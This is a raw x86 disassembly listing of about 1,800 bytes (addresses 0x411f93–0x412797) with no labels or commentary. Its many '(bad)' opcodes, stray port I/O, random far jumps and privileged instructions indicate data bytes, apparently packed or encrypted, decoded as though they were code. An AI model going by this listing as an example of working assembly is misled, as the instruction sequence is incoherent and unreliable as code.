  411f93:	gs rcr ch,0x86
  411f97:	mov    esp,0x14e8a3e
  411f9c:	mov    esi,DWORD PTR [edi-0x1c]
  411f9f:	lahf   
  411fa0:	dec    esp
  411fa1:	(bad)  
  411fa2:	inc    eax
  411fa3:	test   eax,0x52aa56b6
  411fa8:	addr16 aaa 
  411faa:	sub    BYTE PTR [ecx+0x49],al
  411fad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411fae:	mov    al,ds:0x636abb18
  411fb3:	out    dx,al
  411fb4:	mov    ebp,0x9173f885
  411fba:	test   al,0x99
  411fbc:	stc    
  411fbd:	sahf   
  411fbe:	xor    BYTE PTR [esi],dh
  411fc0:	test   esi,ebp
  411fc2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411fc3:	or     edi,0x9f91feef
  411fc9:	loope  0x411ff0
  411fcb:	xor    ch,bh
  411fcd:	sbb    BYTE PTR [esi],dl
  411fcf:	rol    edi,cl
  411fd1:	iret   
  411fd2:	and    eax,0xccf4f403
  411fd7:	retf   0x6468
  411fda:	and    ecx,edx
  411fdc:	xor    ebx,esp
  411fde:	jge    0x412031
  411fe0:	xchg   ecx,eax
  411fe1:	into   
  411fe2:	cld    
  411fe3:	xor    BYTE PTR [eax],0xf8
  411fe6:	inc    eax
  411fe7:	addr16 mov esi,0x4d746ea8
  411fed:	or     edi,0x771a7a3e
  411ff3:	addr16 pop edx
  411ff5:	or     eax,DWORD PTR [esi+0x3d]
  411ff8:	pusha  
  411ff9:	shl    DWORD PTR [ebp+0x69],1
  411ffc:	push   edx
  411ffd:	repnz (bad) 
  411fff:	and    ecx,DWORD PTR [ebp+0x48]
  412002:	clc    
  412003:	sbb    ecx,DWORD PTR [edi-0x1e]
  412006:	js     0x411ff0
  412008:	in     eax,dx
  412009:	xor    DWORD PTR cs:[edi+edi*8],eax
  41200d:	mov    ebx,0xcd845766
  412012:	enter  0x3bf3,0x35
  412016:	mov    eax,DWORD PTR [ebx+ebx*1-0x65]
  41201a:	jae    0x412043
  41201c:	scas   al,BYTE PTR es:[edi]
  41201d:	aas    
  41201e:	sbb    DWORD PTR [esi+0xe31ddfc],ebp
  412024:	stc    
  412025:	loope  0x412082
  412027:	xor    bh,BYTE PTR [esi-0x380372d5]
  41202d:	mov    ebp,0x28b34a32
  412032:	out    dx,eax
  412033:	jmp    0x9061010d
  412038:	pop    esi
  412039:	add    ecx,esi
  41203b:	mov    al,BYTE PTR [ecx+0x18]
  41203e:	int    0x39
  412040:	lea    ecx,[ecx+0x5f]
  412043:	dec    ebx
  412044:	inc    edi
  412045:	mov    dl,0xe5
  412047:	in     al,dx
  412048:	push   ss
  412049:	mov    WORD PTR [edi+edx*1+0x57],ss
  41204d:	outs   dx,BYTE PTR ds:[esi]
  41204e:	jbe    0x412042
  412050:	sub    DWORD PTR ds:0x624a1b43,ebx
  412056:	inc    ebx
  412057:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412058:	je     0x411fe7
  41205a:	aas    
  41205b:	cmp    eax,0x568a4307
  412060:	lds    edx,FWORD PTR [edi-0x690f4493]
  412066:	dec    esp
  412067:	mov    WORD PTR [ecx],gs
  412069:	inc    esp
  41206a:	aam    0xe0
  41206c:	(bad)  
  41206d:	add    DWORD PTR [ecx+eax*4+0x1a551696],eax
  412074:	jecxz  0x4120b9
  412076:	inc    edi
  412077:	pop    ss
  412078:	xchg   ebp,eax
  412079:	cmc    
  41207a:	inc    ebp
  41207b:	fwait
  41207c:	dec    ebp
  41207d:	jle    0x4120e4
  41207f:	mov    eax,ds:0xf3d63980
  412084:	pop    ss
  412085:	test   BYTE PTR [esi+ebx*2+0xc],0xda
  41208a:	dec    edx
  41208b:	dec    edi
  41208c:	dec    ecx
  41208d:	cmp    DWORD PTR [ebx+esi*8-0x34fff72],ecx
  412094:	arpl   ax,cx
  412096:	inc    ebp
  412097:	in     eax,dx
  412098:	pop    ebp
  412099:	pop    esi
  41209a:	scas   al,BYTE PTR es:[edi]
  41209b:	and    al,0xa7
  41209d:	lea    edx,[edx+edx*4]
  4120a0:	cmp    BYTE PTR [ebx-0x73ee92c8],0xc9
  4120a7:	xchg   edx,eax
  4120a8:	and    al,0x29
  4120aa:	jns    0x41208d
  4120ac:	jns    0x41211f
  4120ae:	xchg   BYTE PTR [ebp+0x64b9a663],al
  4120b4:	jmp    0x41212c
  4120b6:	sub    esi,DWORD PTR [ecx+eax*1+0x33]
  4120ba:	sbb    ah,BYTE PTR [edi+0x135e2d8d]
  4120c0:	inc    ebp
  4120c1:	add    al,0x7a
  4120c3:	or     dh,BYTE PTR [esi+0x6382eb1e]
  4120c9:	inc    esp
  4120ca:	retf   
  4120cb:	jmp    0xf30b53ed
  4120d0:	cmp    cl,bh
  4120d2:	lods   eax,DWORD PTR ds:[esi]
  4120d3:	setae  bh
  4120d6:	inc    esp
  4120d7:	loop   0x412074
  4120d9:	sbb    BYTE PTR [ecx-0x69],al
  4120dc:	stc    
  4120dd:	retf   
  4120de:	and    ah,BYTE PTR [edi+0x4251b8af]
  4120e4:	fcmovu st,st(1)
  4120e6:	push   cs
  4120e7:	ror    DWORD PTR [esi+0x1d900ea0],cl
  4120ed:	inc    eax
  4120ee:	cmp    BYTE PTR ds:0x4d474fb0,bl
  4120f4:	ror    BYTE PTR [edx+0x6343ffbb],1
  4120fa:	dec    eax
  4120fb:	adc    bh,BYTE PTR [ebp+ecx*1+0x249f761a]
  412102:	mov    edi,0x38118477
  412107:	cs pop ds
  412109:	or     bl,al
  41210b:	out    0x77,eax
  41210d:	sub    al,0x90
  41210f:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  412111:	jmp    0x412173
  412113:	push   ebp
  412114:	jle    0x412167
  412116:	mov    dh,0x8a
  412118:	loop   0x412192
  41211a:	inc    eax
  41211b:	dec    edx
  41211c:	inc    esp
  41211d:	and    eax,0x30fe81ee
  412122:	sti    
  412123:	or     BYTE PTR [edi-0x4e],ch
  412126:	je     0x4120d1
  412128:	call   0x1c1a:0xad3aa492
  41212f:	movups xmm2,xmm6
  412132:	xor    eax,0x724406a2
  412137:	clc    
  412138:	ret    
  412139:	repnz int3 
  41213b:	aas    
  41213c:	push   edx
  41213d:	out    dx,eax
  41213e:	loopne 0x412183
  412140:	or     DWORD PTR [ebp-0x7569110f],ebp
  412146:	stc    
  412147:	mov    eax,ds:0x6ac1ab66
  41214c:	jo     0x4121b1
  41214e:	xor    BYTE PTR [edx+edi*1],0x63
  412152:	inc    eax
  412153:	xor    DWORD PTR [edi+0x4536718c],ebp
  412159:	sbb    al,0xc9
  41215b:	fnstcw WORD PTR [esi-0x27ea6358]
  412161:	int3   
  412162:	ret    
  412163:	retf   
  412164:	nop
  412165:	push   esp
  412166:	inc    ebx
  412167:	xor    eax,0x596ecb6e
  41216c:	xor    esp,DWORD PTR [eax]
  41216e:	int3   
  41216f:	ret    0x33dc
  412172:	stc    
  412173:	push   esp
  412174:	cdq    
  412175:	out    0x64,al
  412177:	jle    0x412197
  412179:	sbb    BYTE PTR [edx-0x5e0202be],bl
  41217f:	es cmp ebp,esi
  412182:	pop    esi
  412183:	or     al,0x36
  412185:	sub    DWORD PTR [edi+edi*4-0x75b8278],ebp
  41218c:	pop    ss
  41218d:	in     eax,dx
  41218e:	pusha  
  41218f:	xlat   BYTE PTR fs:[ebx]
  412191:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412192:	jne    0x41220e
  412194:	mov    ecx,0xc4d257b6
  412199:	dec    edx
  41219a:	pop    edi
  41219b:	xchg   DWORD PTR gs:[esi+0xe59ce5d],edx
  4121a2:	dec    esp
  4121a3:	jg     0x412186
  4121a5:	repz cmc 
  4121a7:	(bad)  
  4121a8:	xor    ebp,DWORD PTR [ecx+ebp*1-0x242c966d]
  4121af:	(bad)  
  4121b0:	and    esp,DWORD PTR [edi]
  4121b2:	cmp    edi,edi
  4121b4:	sbb    BYTE PTR [edx+edx*2],cl
  4121b7:	jno    0x4121e2
  4121b9:	mov    cl,0x74
  4121bb:	push   ds
  4121bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4121bd:	aad    0x45
  4121bf:	ss push eax
  4121c1:	iret   
  4121c2:	pop    ds
  4121c3:	test   eax,edi
  4121c5:	add    eax,0xdcd1ab43
  4121ca:	pop    ss
  4121cb:	push   esi
  4121cc:	jo     0x412169
  4121ce:	repz xchg dx,ax
  4121d1:	retf   
  4121d2:	xchg   edi,eax
  4121d3:	xor    al,0x89
  4121d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4121d6:	das    
  4121d7:	sub    eax,0xe8b19c66
  4121dc:	adc    BYTE PTR [ebx+0x4cb43021],0xe7
  4121e3:	mov    bl,0x4
  4121e5:	mov    ds:0xfa55296c,al
  4121ea:	inc    edx
  4121eb:	pusha  
  4121ec:	jmp    0x41219b
  4121ee:	fmul   st(5),st
  4121f0:	jb     0x41217b
  4121f2:	int    0xa1
  4121f4:	outs   dx,DWORD PTR ds:[esi]
  4121f5:	scas   al,BYTE PTR es:[edi]
  4121f6:	mov    esi,DWORD PTR [eax+ebx*2+0x12b844d4]
  4121fd:	xor    esi,DWORD PTR [edx+0x1b]
  412200:	cmp    DWORD PTR [eax+esi*8+0x68],edi
  412204:	push   ebp
  412205:	inc    ebp
  412206:	in     eax,0xc9
  412208:	xor    DWORD PTR [edi],0x11
  41220b:	jns    0x412275
  41220d:	inc    esp
  41220e:	push   esi
  41220f:	fidiv  WORD PTR [ebx]
  412211:	push   0x9
  412213:	call   0xbb75cc13
  412218:	test   BYTE PTR [edi-0x1ff5b892],dl
  41221e:	and    ah,ah
  412220:	push   ebx
  412221:	xor    dl,bh
  412223:	jb     0x412230
  412225:	sub    edi,DWORD PTR [edi]
  412227:	mov    dh,0xe7
  412229:	aaa    
  41222a:	xchg   ecx,eax
  41222b:	cmp    dl,al
  41222d:	sbb    al,0xc8
  41222f:	sub    esi,DWORD PTR [esi-0x52]
  412232:	add    bl,BYTE PTR [ebx-0x6]
  412235:	add    DWORD PTR [ebx+0x3f599bc3],eax
  41223b:	dec    esi
  41223c:	rol    ebp,cl
  41223e:	fdiv   QWORD PTR [ebp+0x280ce1e6]
  412244:	sub    eax,DWORD PTR [esi+0x4a690f72]
  41224a:	pop    esp
  41224b:	adc    al,0x83
  41224d:	xchg   ecx,eax
  41224e:	(bad)  
  41224f:	lods   eax,DWORD PTR ds:[esi]
  412250:	sahf   
  412251:	test   BYTE PTR ds:[ecx],ch
  412254:	push   edx
  412255:	(bad)  
  412256:	pop    esp
  412257:	ins    BYTE PTR es:[edi],dx
  412258:	int    0x9a
  41225a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41225b:	xor    BYTE PTR [esi+0x45],0xbb
  41225f:	cmp    BYTE PTR ds:0x1b6c3d3e,dh
  412265:	nop
  412266:	jp     0x412253
  412268:	xchg   ebx,eax
  412269:	loopne 0x4121f4
  41226b:	gs (bad) 
  41226d:	mov    eax,ds:0x5b3eebd0
  412272:	(bad)  
  412273:	cmp    BYTE PTR [esi-0x61278769],cl
  412279:	and    bh,ch
  41227b:	cld    
  41227c:	pop    ebx
  41227d:	mov    esp,0x578fe5b
  412282:	les    ebx,FWORD PTR [ebp-0x41]
  412285:	mov    al,ds:0xd429d54a
  41228a:	mov    al,ds:0x3e515f47
  41228f:	or     BYTE PTR [esi+0x717563f6],al
  412295:	loopne 0x41229a
  412297:	jg     0x41221a
  412299:	mov    dl,0x1e
  41229b:	inc    esi
  41229c:	dec    ecx
  41229d:	mov    eax,ds:0xe015a9d6
  4122a2:	jg     0x4122d1
  4122a4:	lock xchg edi,eax
  4122a6:	rcr    BYTE PTR [ecx],1
  4122a8:	cmp    dh,bh
  4122aa:	jno    0x412233
  4122ac:	rol    BYTE PTR [eax+0x4046385f],1
  4122b2:	cld    
  4122b3:	imul   ebp,edi,0xbf49d347
  4122b9:	adc    eax,DWORD PTR [ecx]
  4122bb:	and    BYTE PTR [edx],0xb4
  4122be:	(bad)  
  4122bf:	jae    0x41225c
  4122c1:	shr    DWORD PTR [eax],1
  4122c3:	out    0x49,al
  4122c5:	dec    ecx
  4122c6:	fild   WORD PTR ds:0x92307a8
  4122cc:	fscale 
  4122ce:	rcl    DWORD PTR [ebx+0x19],0x58
  4122d2:	stos   BYTE PTR es:[edi],al
  4122d3:	sub    al,0x1d
  4122d5:	scas   eax,DWORD PTR es:[edi]
  4122d6:	clc    
  4122d7:	frstpm(287 only) 
  4122d9:	xlat   BYTE PTR ds:[ebx]
  4122da:	and    eax,0xec199ca5
  4122df:	in     al,dx
  4122e0:	pop    ds
  4122e1:	mov    cl,0x23
  4122e3:	rol    DWORD PTR [ebx-0x7b389d25],0x3d
  4122ea:	outs   dx,BYTE PTR ds:[esi]
  4122eb:	mov    edx,DWORD PTR [edx]
  4122ed:	jg     0x4122e9
  4122ef:	adc    eax,0xb822b86
  4122f4:	lods   eax,DWORD PTR ds:[esi]
  4122f5:	jmp    0xe011efa8
  4122fa:	int    0x79
  4122fc:	(bad)  
  4122fd:	in     al,0x2e
  4122ff:	repnz and al,BYTE PTR [edi-0x36]
  412303:	cmp    dl,ah
  412305:	xlat   BYTE PTR ds:[ebx]
  412306:	xchg   esi,eax
  412307:	mov    esp,0xc33d4bd7
  41230c:	stos   DWORD PTR es:[edi],eax
  41230d:	jge    0x412388
  41230f:	fbld   TBYTE PTR [ecx+ebx*8]
  412312:	mov    al,ds:0x1058ea13
  412317:	int3   
  412318:	(bad)  
  41231a:	and    ch,BYTE PTR [eax-0x337ec21d]
  412320:	cmp    BYTE PTR ds:0x67adef30,dh
  412326:	pop    esp
  412327:	ds popf 
  412329:	(bad)  
  41232a:	(bad)  
  41232c:	fs adc ch,BYTE PTR ds:[eax+ebp*4]
  412331:	scas   al,BYTE PTR es:[edi]
  412332:	pusha  
  412333:	and    eax,0xd2888796
  412338:	sar    DWORD PTR [ebp+0x30e9f429],1
  41233e:	lahf   
  41233f:	mov    dl,cl
  412341:	sbb    eax,0x3cb4b905
  412346:	pushf  
  412347:	(bad)  
  412348:	push   ecx
  412349:	sbb    bl,BYTE PTR ds:0x2b14cdeb
  41234f:	aad    0x53
  412351:	lods   eax,DWORD PTR fs:[esi]
  412353:	push   cs
  412354:	rol    DWORD PTR [ebx+0x2a4eff0e],1
  41235a:	jb     0x412332
  41235c:	mov    gs,WORD PTR [edx-0x23a94cfe]
  412362:	xchg   ecx,eax
  412363:	push   ebx
  412364:	pop    ss
  412365:	test   al,dl
  412367:	push   ebp
  412368:	jnp    0x4123c2
  41236a:	xchg   BYTE PTR [edi-0x5dce39a8],ch
  412370:	scas   eax,DWORD PTR es:[edi]
  412371:	jge    0x4123db
  412373:	and    DWORD PTR [ebx],esp
  412375:	sbb    eax,0x231f6157
  41237a:	retf   0xf5e5
  41237d:	fistp  DWORD PTR fs:[eax+0x49]
  412381:	gs push 0xffffffdb
  412384:	cdq    
  412385:	(bad)  
  412386:	jb     0x4123a1
  412388:	mov    ecx,0xfc0d323
  41238d:	jo     0x4123bd
  41238f:	test   DWORD PTR [eax],ebp
  412391:	in     al,dx
  412392:	imul   ebx,DWORD PTR [ebp-0x6f],0x49
  412396:	repz add eax,0x54a8cea9
  41239c:	xchg   edi,eax
  41239d:	ins    DWORD PTR es:[edi],dx
  41239e:	aaa    
  41239f:	mov    bl,0x3b
  4123a1:	lds    edi,FWORD PTR [ebx]
  4123a3:	loope  0x41235b
  4123a5:	pop    ds
  4123a6:	enter  0xbb8b,0x44
  4123aa:	adc    eax,0x1d976965
  4123af:	adc    DWORD PTR ds:0x89934142,edx
  4123b5:	and    eax,0x283c9637
  4123ba:	or     al,ch
  4123bc:	inc    edx
  4123bd:	loopne 0x4123c9
  4123bf:	or     DWORD PTR [esp+eiz*2+0x6e],edi
  4123c3:	push   esp
  4123c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4123c5:	fcmovne st,st(4)
  4123c7:	adc    BYTE PTR ds:0x77ca8291,cl
  4123cd:	loopne 0x4123a5
  4123cf:	jae    0x412362
  4123d1:	(bad)  [ecx-0x888e60c]
  4123d7:	jns    0x41237b
  4123d9:	out    dx,eax
  4123da:	pop    eax
  4123db:	or     bh,BYTE PTR [edi-0x2cf5da9f]
  4123e1:	iret   
  4123e2:	and    DWORD PTR [ecx-0x7c],edx
  4123e5:	int    0x1f
  4123e7:	in     eax,dx
  4123e8:	sahf   
  4123e9:	imul   edi,DWORD PTR [ebp+0x3e326319],0x640ff9bd
  4123f3:	xor    esp,DWORD PTR [ebx-0x1d]
  4123f6:	leave  
  4123f7:	dec    edi
  4123f8:	rcr    BYTE PTR [edx+0xe75ee14],1
  4123fe:	mov    esp,0x58161a2f
  412403:	arpl   bp,cx
  412405:	sbb    al,0xd3
  412407:	sahf   
  412408:	cmp    al,bh
  41240a:	out    dx,al
  41240b:	mov    ds:0xa92b3382,eax
  412410:	cld    
  412411:	mov    ds:0x1f9f1116,al
  412416:	cmp    ah,BYTE PTR [edi-0x7e4a398c]
  41241c:	mov    ebp,0x9d8a86b4
  412421:	pop    edi
  412422:	sahf   
  412423:	pop    es
  412424:	js     0x412436
  412426:	sub    ch,cl
  412428:	inc    edi
  412429:	in     eax,0x54
  41242b:	dec    dl
  41242d:	adc    ebp,DWORD PTR [ecx+0x42bf4723]
  412433:	in     eax,0xe1
  412435:	or     eax,0xf8b38a9e
  41243a:	nop
  41243b:	repnz ror BYTE PTR [edx],cl
  41243e:	ja     0x4123f7
  412440:	fmul   DWORD PTR [edx]
  412442:	repz push esi
  412444:	syscall 
  412446:	jns    0x41249d
  412448:	mov    dh,0xf
  41244a:	out    dx,al
  41244b:	(bad)  
  41244d:	inc    esp
  41244e:	xchg   ecx,eax
  41244f:	inc    ebp
  412450:	mov    esp,0xb08b9009
  412455:	xchg   ebx,eax
  412456:	xchg   esp,eax
  412457:	pop    ebx
  412458:	cmc    
  412459:	(bad)  
  41245a:	xchg   edx,eax
  41245b:	lea    esi,[ecx]
  41245d:	in     eax,dx
  41245e:	daa    
  41245f:	mov    WORD PTR [edx],fs
  412461:	aad    0x78
  412463:	inc    ecx
  412464:	adc    al,0xb5
  412466:	cdq    
  412467:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412468:	push   ss
  412469:	leave  
  41246a:	or     ecx,esi
  41246c:	mov    edi,esp
  41246e:	mov    bh,0x39
  412470:	sbb    BYTE PTR [eax+ebp*1+0x637c277a],bh
  412477:	fidivr DWORD PTR [ecx-0x1b]
  41247a:	arpl   WORD PTR [esp+edx*8-0xe],bx
  41247e:	mov    ah,0xd
  412480:	or     esi,esi
  412482:	cmp    DWORD PTR [edi-0x67],0x2aba7517
  412489:	das    
  41248a:	cdq    
  41248b:	sub    al,BYTE PTR [edi+0x2a6e5bd4]
  412491:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412492:	add    eax,0xf5a786c
  412497:	xor    eax,0x378920c9
  41249c:	ror    BYTE PTR [ebx],cl
  41249e:	cmp    edi,DWORD PTR [edi]
  4124a0:	mov    ebp,0xf2cdbaa7
  4124a5:	outs   dx,DWORD PTR ds:[esi]
  4124a6:	push   ebx
  4124a7:	sbb    al,0xa7
  4124a9:	mov    ?,WORD PTR [edx+0x2c61a162]
  4124af:	mov    bh,dl
  4124b1:	mov    bh,0xc5
  4124b3:	daa    
  4124b4:	cwde   
  4124b5:	jmp    0xdd0a:0x869d8f31
  4124bc:	jle    0x412481
  4124be:	push   ds
  4124bf:	mov    ebp,0x321522e7
  4124c4:	push   edi
  4124c5:	out    dx,al
  4124c6:	push   ebx
  4124c7:	push   esp
  4124c8:	xor    DWORD PTR [esi-0x15e8aa65],esi
  4124ce:	(bad)  
  4124cf:	dec    esp
  4124d0:	or     DWORD PTR [esi+0x5fd5e4ad],ebp
  4124d6:	les    edx,FWORD PTR [ecx+edi*8]
  4124d9:	cld    
  4124da:	mov    BYTE PTR [eax+0x1841f8cd],ch
  4124e0:	pop    esi
  4124e1:	jmp    0x4124bc
  4124e3:	int3   
  4124e4:	arpl   cx,di
  4124e6:	popf   
  4124e7:	sub    BYTE PTR [ebp+0x66],ch
  4124ea:	scas   eax,DWORD PTR es:[edi]
  4124eb:	imul   edi,DWORD PTR [esi],0x4f
  4124ee:	aas    
  4124ef:	xor    BYTE PTR [esi],ah
  4124f1:	mov    dl,0x14
  4124f3:	mov    ah,0x57
  4124f5:	(bad)  
  4124f6:	cmp    al,0x3
  4124f8:	sbb    eax,0x61096fbd
  4124fd:	mov    ecx,0xcd16e59a
  412502:	fdivr  QWORD PTR [edi+0x5d2135e2]
  412508:	icebp  
  412509:	mov    BYTE PTR [edx+0x29c78c0c],ch
  41250f:	je     0x4124de
  412511:	shl    BYTE PTR [esi+0x9],0xa9
  412515:	clc    
  412516:	sub    esi,DWORD PTR [esi+0x44]
  412519:	jge    0x412576
  41251b:	adc    DWORD PTR [edx],0x3e3ec44b
  412521:	inc    esp
  412522:	mov    ah,0x18
  412524:	mov    ecx,DWORD PTR ds:[edx]
  412527:	cdq    
  412528:	shr    DWORD PTR [ebx],1
  41252a:	jl     0x41253e
  41252c:	in     al,dx
  41252d:	adc    BYTE PTR [eax-0x1c],bl
  412530:	lods   al,BYTE PTR ds:[esi]
  412531:	sbb    bh,BYTE PTR [eax-0x6d]
  412534:	out    0x9d,eax
  412536:	pop    es
  412537:	xor    al,0xae
  412539:	jmp    0x412549
  41253b:	push   es
  41253c:	arpl   dx,ax
  41253e:	test   al,0xa9
  412540:	fs push cs
  412542:	retf   0x53c9
  412545:	and    edx,DWORD PTR [ebp+0x5d2c19a8]
  41254b:	test   al,0x20
  41254d:	ret    
  41254e:	push   cs
  41254f:	mov    ds:0x7313e3,al
  412554:	jns    0x41258d
  412556:	push   edx
  412557:	inc    esi
  412558:	adc    DWORD PTR [ebp-0x1b],edx
  41255b:	pop    edi
  41255c:	(bad)  
  41255d:	adc    edi,edi
  41255f:	or     DWORD PTR [edi+ecx*1+0x14],esi
  412563:	inc    edx
  412564:	inc    ecx
  412565:	cs in  eax,0x9e
  412568:	dec    edx
  412569:	call   0xcc64bd25
  41256e:	or     BYTE PTR [ebx+ebp*4-0x1f],ah
  412572:	test   eax,0x85ec7fd0
  412577:	lea    ebp,[edi+0x18]
  41257a:	xchg   esp,eax
  41257b:	cli    
  41257c:	cmp    eax,0x5c34072b
  412581:	jg     0x4125c2
  412583:	and    al,0x3d
  412585:	sub    ch,BYTE PTR [esi+0x42]
  412588:	mov    ah,bl
  41258a:	mov    dh,0x6
  41258c:	shl    DWORD PTR [ebp+0x2565636c],1
  412592:	push   edi
  412593:	xor    al,0x70
  412595:	inc    ecx
  412596:	aaa    
  412597:	test   eax,0x9613796e
  41259c:	cld    
  41259d:	push   esp
  41259e:	push   esi
  41259f:	xchg   edi,eax
  4125a0:	into   
  4125a1:	jo     0x412544
  4125a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4125a4:	push   edi
  4125a5:	cmc    
  4125a6:	and    eax,0x5ba10fad
  4125ab:	cmp    DWORD PTR [ebx+0x63305258],ebx
  4125b1:	shl    BYTE PTR [edx+0x37ec9fec],0x53
  4125b8:	out    dx,al
  4125b9:	repz push ecx
  4125bb:	sti    
  4125bc:	out    0x78,eax
  4125be:	push   ds
  4125bf:	and    DWORD PTR [ebp+0x32a60482],0x63
  4125c6:	mov    DWORD PTR [eax],ebp
  4125c8:	xchg   ecx,eax
  4125c9:	cdq    
  4125ca:	xchg   esp,eax
  4125cb:	cmp    BYTE PTR [edx+edx*2-0x4],dh
  4125cf:	sbb    BYTE PTR cs:[eax],al
  4125d2:	data16 lods al,BYTE PTR ds:[esi]
  4125d4:	rcl    BYTE PTR [ebx],0x67
  4125d7:	mov    es,WORD PTR [eax-0x62335aea]
  4125dd:	mov    bl,0xd4
  4125df:	or     eax,0x43398cbb
  4125e4:	lahf   
  4125e5:	push   ecx
  4125e6:	mov    eax,0x5705834
  4125eb:	add    dl,0x8b
  4125ee:	cld    
  4125ef:	mov    dh,0xc0
  4125f1:	sub    bh,bh
  4125f3:	jmp    0xb228:0x3b65076f
  4125fa:	call   FWORD PTR [edi]
  4125fc:	jae    0x412652
  4125fe:	ror    DWORD PTR ds:0x71d6182,1
  412604:	jge    0x41261c
  412606:	add    esp,DWORD PTR [ebx+0x5f1915df]
  41260c:	xchg   ebp,eax
  41260d:	xor    eax,0xb353e377
  412612:	jae    0x4125a4
  412614:	and    eax,0x42efedbd
  412619:	aam    0x99
  41261b:	test   al,al
  41261d:	xchg   edx,eax
  41261e:	jecxz  0x41264a
  412620:	mov    eax,0x526f2be6
  412625:	adc    BYTE PTR [ebp+0x44],0xe8
  412629:	test   eax,0x9abca000
  41262e:	std    
  41262f:	(bad)  
  412630:	sub    eax,0xe09e5749
  412635:	(bad)  
  412636:	adc    al,0x2f
  412638:	fld    QWORD PTR [edi-0x4a47d98c]
  41263e:	int    0xa6
  412640:	mov    ds:0x4cc857ba,eax
  412645:	bound  esi,QWORD PTR [esi]
  412647:	inc    esi
  412648:	and    al,0x88
  41264a:	repnz mov cs,edx
  41264d:	jmp    0x551b:0xabf9ec3d
  412654:	adc    edi,0x2e
  412657:	mov    bl,0x8b
  412659:	mov    ds:0xb6ed2952,eax
  41265e:	and    BYTE PTR [eax+0x2d],bl
  412661:	call   0xb7f47e58
  412666:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412667:	or     bl,al
  412669:	scas   al,BYTE PTR es:[edi]
  41266a:	mov    edi,0x993d153b
  41266f:	mov    ss,WORD PTR [esi-0x31]
  412672:	fistp  WORD PTR [ebp-0x59]
  412675:	add    DWORD PTR ds:0xbdce8973,eax
  41267b:	xor    bh,BYTE PTR [ecx]
  41267d:	fstp   QWORD PTR [esi+0x2d1704b2]
  412683:	rol    BYTE PTR [esi+0x3b38ee13],0xf3
  41268a:	mov    ecx,0x5e48e03d
  41268f:	push   edx
  412690:	jge    0x4126d0
  412692:	not    DWORD PTR [edx-0x3996c80d]
  412698:	xchg   esp,eax
  412699:	mov    al,BYTE PTR [esp+edi*8]
  41269c:	pop    ebx
  41269d:	pop    ecx
  41269e:	mov    ds:0xf26164f8,al
  4126a3:	imul   esi,DWORD PTR [ebp+0x1f],0xffffffb1
  4126a7:	sbb    dh,ch
  4126a9:	inc    ecx
  4126aa:	xchg   DWORD PTR [esi+0x5f],ebp
  4126ad:	xor    al,0x10
  4126af:	pop    edi
  4126b0:	bound  edi,QWORD PTR [ecx+0x8]
  4126b3:	xor    eax,0x8a71443f
  4126b8:	push   edx
  4126b9:	sbb    ax,bp
  4126bc:	mov    ecx,0x316c06e6
  4126c1:	and    eax,DWORD PTR [edx+0x2e]
  4126c4:	test   ebp,eax
  4126c6:	ss jmp 0xffd0517d
  4126cc:	xchg   ecx,eax
  4126cd:	shl    DWORD PTR [eax+0x4d051fa3],cl
  4126d3:	cwde   
  4126d4:	pop    edx
  4126d5:	stc    
  4126d6:	add    cl,BYTE PTR [esi+0x3f]
  4126d9:	stos   DWORD PTR es:[edi],eax
  4126da:	pop    eax
  4126db:	(bad)  
  4126dc:	xlat   BYTE PTR ds:[ebx]
  4126dd:	ins    BYTE PTR es:[edi],dx
  4126de:	inc    edx
  4126df:	xor    al,BYTE PTR ds:0xf4ab2176
  4126e5:	or     al,BYTE PTR [eax-0x508f011e]
  4126eb:	hlt    
  4126ec:	xchg   ebx,eax
  4126ed:	es xchg esi,eax
  4126ef:	xchg   esp,eax
  4126f0:	push   ecx
  4126f1:	addr16 xchg ebx,eax
  4126f3:	int3   
  4126f4:	and    esi,DWORD PTR ds:0x1313b5e7
  4126fa:	fpatan 
  4126fc:	or     al,0xa4
  4126fe:	jge    0x4126cc
  412700:	pop    ebp
  412701:	cmp    al,0x85
  412703:	push   edx
  412704:	leave  
  412705:	jp     0x4126c9
  412707:	stos   DWORD PTR es:[edi],eax
  412708:	mov    dl,0xca
  41270b:	mov    eax,0x422f07b
  412710:	retf   
  412711:	push   ebx
  412712:	cld    
  412713:	mov    esi,0xaf744d9b
  412718:	pop    ds
  412719:	dec    edi
  41271a:	fwait
  41271b:	pop    edx
  41271c:	and    bl,BYTE PTR [esi+edi*8+0x15]
  412720:	sub    al,0xf1
  412722:	add    DWORD PTR [edx-0x9],0xbf6acc22
  412729:	jmp    0x60135959
  41272e:	adc    BYTE PTR [esi-0xa6d5df4],bh
  412734:	retf   
  412735:	test   eax,0x15cab014
  41273a:	mov    ah,0x6
  41273c:	stos   BYTE PTR es:[edi],al
  41273d:	mov    cs,WORD PTR [esi]
  41273f:	mov    edi,edx
  412741:	into   
  412742:	cdq    
  412743:	gs mov al,0xf
  412746:	mov    WORD PTR [edi],fs
  412748:	div    al
  41274a:	xor    DWORD PTR [eax+0x19a4a709],esp
  412750:	xor    eax,DWORD PTR [ebp-0x12]
  412753:	add    DWORD PTR [esi+0x1a],0x2cc1ec35
  41275a:	sbb    BYTE PTR [ecx+0x4ce24e50],0xf4
  412761:	jnp    0x412763
  412763:	test   eax,0xe5687c90
  412768:	sbb    al,BYTE PTR [edx-0x33]
  41276b:	cld    
  41276c:	xor    DWORD PTR [ecx],edx
  41276e:	aam    0x7e
  412770:	imul   ebx,edi,0x53ff390b
  412776:	sar    DWORD PTR [edx],0x60
  412779:	mov    BYTE PTR [edx+ebx*8],dl
  41277c:	pop    edx
  41277d:	push   ecx
  41277e:	and    al,0x5e
  412780:	pop    edi
  412781:	cmp    eax,0x46fb8c91
  412786:	retf   0x57f0
  412789:	loope  0x41278a
  41278b:	sbb    cl,BYTE PTR [ecx-0x4b423db9]
  412791:	and    eax,0x80879351
  412796:	into   
  412797:	pop    ebx
